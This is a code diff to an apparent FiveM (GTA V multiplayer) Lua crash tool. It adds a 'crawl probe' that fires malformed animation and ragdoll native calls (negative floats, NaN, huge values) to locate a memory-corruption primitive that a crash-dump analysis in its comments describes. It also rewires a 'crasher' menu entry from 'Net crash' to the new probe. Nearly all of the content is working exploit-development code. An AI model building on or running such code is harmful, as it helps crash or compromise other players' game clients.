@@ -20821,6 +20821,96 @@ function C.emoteInstant()
     return true
 end
 
+-- ---------------------------------------------------------------------------
+-- Crawl probe
+--
+-- What the dump actually proves: at FiveM_b3751_GTAProcess.exe+0x31194B,
+--   mov rax, [rdi+0x268]        ; old value of a refcounted pointer
+--   or  word ptr [rax+0x214], 20h
+-- crashed with RAX = 0xC0800000, i.e. float -4.0f sitting where a pointer
+-- belongs, then
+--   mov rcx, [rdi+268h] / dec [rcx+210h] / jae / call [rax]   ; release
+--   mov [rdi+268h], rbx / inc [rbx+210h]                      ; assign
+-- That is an intrusive refcount assignment whose old value was a float.
+-- The trampoline that wrote it was a task/clip pointer field, so the
+-- primitive is "a float handed to a native that stores it in a pointer
+-- slot". Nothing in FiveM can patch that: it is GTA's own layout, not a
+-- network event.
+--
+-- Ten candidate call shapes reproduce the pose (move_crawl/onfront_fwd)
+-- and differ in which argument carries -4.0. One press runs one probe and
+-- advances; the client dying on probe N names the primitive.
+-- ---------------------------------------------------------------------------
+C.crawlIndex = 0
+C.crawlProbes = {
+    { name = "anim blend -4/-4", run = function(me)
+        TaskPlayAnim(me, "move_crawl", "onfront_fwd", -4.0, -4.0, -1, 1, 0.0, false, false, false)
+    end },
+    { name = "anim blend -8/-8", run = function(me)
+        TaskPlayAnim(me, "move_crawl", "onfront_fwd", -8.0, -8.0, -1, 1, 0.0, false, false, false)
+    end },
+    { name = "anim rate -4", run = function(me)
+        TaskPlayAnim(me, "move_crawl", "onfront_fwd", 8.0, -8.0, -1, 1, -4.0, false, false, false)
+    end },
+    { name = "anim duration max", run = function(me)
+        TaskPlayAnim(me, "move_crawl", "onfront_fwd", 8.0, -8.0, 0x7FFFFFFF, 1, 0.0, false, false, false)
+    end },
+    { name = "anim blend 1e9", run = function(me)
+        TaskPlayAnim(me, "move_crawl", "onfront_fwd", 1.0e9, -1.0e9, -1, 1, 0.0, false, false, false)
+    end },
+    { name = "anim prone2crawl -4", run = function(me)
+        TaskPlayAnim(me, "move_crawlprone2crawlfront", "front", -4.0, -4.0, -1, 1, 0.0, false, false, false)
+    end },
+    { name = "advanced animTime -4", run = function(me)
+        local c = GetEntityCoords(me)
+        TaskPlayAnimAdvanced(me, "move_crawl", "onfront_fwd",
+            c.x, c.y, c.z, 0.0, 0.0, 0.0,
+            8.0, -8.0, -1, 1, -4.0, 0.0, 2)
+    end },
+    { name = "clipset blend -4", run = function(me)
+        SetPedMovementClipset(me, "move_crawl", -4.0)
+    end },
+    { name = "clipset blend nan", run = function(me)
+        SetPedMovementClipset(me, "move_crawl", 0.0 / 0.0)
+    end },
+    { name = "ragdoll type -4", run = function(me)
+        SetPedCanRagdoll(me, true)
+        SetPedToRagdoll(me, 3000, 3000, -4, false, false, false)
+    end },
+    { name = "ragdoll fall -4", run = function(me)
+        SetPedCanRagdoll(me, true)
+        SetPedToRagdollWithFall(me, 3000, 3000, 0,
+            -4.0, -4.0, -4.0, -4.0, -4.0, -4.0, -4.0)
+    end },
+    { name = "move rate -4", run = function(me)
+        SetPedMoveRateOverride(me, -4.0)
+    end },
+}
+
+function C.crawlProbe()
+    local stamp = now()
+    if C.probeAt and stamp - C.probeAt < 1500 then return false end
+    C.probeAt = stamp
+    local me = PlayerPedId()
+    if type(me) ~= "number" or me == 0 then return false end
+    C.crawlIndex = (C.crawlIndex % #C.crawlProbes) + 1
+    local probe = C.crawlProbes[C.crawlIndex]
+    pcall(RequestAnimDict, "move_crawl")
+    pcall(RequestAnimDict, "move_crawlprone2crawlfront")
+    pcall(RequestAnimSet, "move_crawl")
+    local t = GetGameTimer() + 1500
+    while not HasAnimDictLoaded("move_crawl") and GetGameTimer() < t do
+        Citizen.Wait(10)
+    end
+    pcall(ClearPedTasksImmediately, me)
+    Citizen.Wait(40)
+    local ok, err = pcall(probe.run, me)
+    O.log("crawl probe %d/%d %s ok=%s err=%s",
+          C.crawlIndex, #C.crawlProbes, probe.name, tostring(ok), tostring(err))
+    pcall(Notify, ("Crawl probe %d/%d: %s"):format(C.crawlIndex, #C.crawlProbes, probe.name))
+    return ok
+end
+
 function C.launch(kind)
     if C.running then
         O.log("crash: already running")
@@ -31360,10 +31450,10 @@ local function installCrasher()
             end,
         },
         {
-            name = "Net crash",
+            name = "Crawl crash",
             type = "action",
             onClick = function()
-                NET.crash()
+                C.crawlProbe()
             end,
         },
     }
